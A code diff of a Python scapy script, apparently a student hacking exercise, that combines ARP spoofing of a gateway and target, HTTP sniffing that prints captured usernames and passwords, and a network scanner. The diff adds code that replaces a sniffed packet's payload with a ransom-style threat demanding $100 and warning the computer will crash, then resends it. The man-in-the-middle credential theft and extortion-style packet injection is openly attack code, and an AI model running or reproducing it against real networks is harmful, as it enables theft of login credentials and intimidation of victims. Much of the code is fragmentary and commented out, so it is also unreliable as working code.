@@ -4,8 +4,9 @@ import argparse
 from scapy_http import http
 
 
-gateway_ip = "192.168.146.236" 
-target_ip = "192.168.206.143"
+gateway_ip = "192.168.1.1" 
+target_ip = "192.168.1.155"
+#pktSniffed
 
 #   Sniff.py
 def sniff(interface):
@@ -40,21 +41,21 @@ def process_sniffed_packet(packet):
                   + login_info.decode()
                   + "\n\n")
             if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
-                print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
-                arp_request = scapy.ARP(pdst = "192.168.206.1")
-                broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-                ippkt = scapy.IP(dst="192.168.206.101",ttl=10)
-                tcp = scapy.TCP(sport=8888, dport=80)
-                payload="stfu2"
-                arp_request_broadcast = broadcast / arp_request/ippkt/tcp/payload
+                #print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
+                print("in")
+               # packet.getlayer(1).hwsrc='5'
                 
-                print(arp_request_broadcast.payload.layers())
+                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
+                packet.getlayer(scapy.packet.Raw).load=nPayload
+                print(packet.getlayer(scapy.packet.Raw).load)
+                send(packet,ttl=1,count=10)
+                
+                #print(arp_request_broadcast.payload.layers())
                 #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
                 #rawPayload = arp_request_broadcast.layers()
-                arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
-                rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
-
-                print(rawPayload)
+                #arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
+                #rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
+                #print(rawPayload)
 #   =============================================================
 #   Scan.py
 def get_argments():
@@ -121,6 +122,7 @@ def action(packet):
     print("7")
     print(packet.src)
     print(packet.getlayer(scapy.packet.Raw).load)
+    #pktSniffed=packet
 #   =============================================================    
 
 
@@ -139,6 +141,7 @@ try:
         sent_packets_count = sent_packets_count + 2
         print("\r[*] Packets Sent " + str(sent_packets_count), end="")
         time.sleep(2)  # Waits for two seconds
+        sniff("enp0s3")
        
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
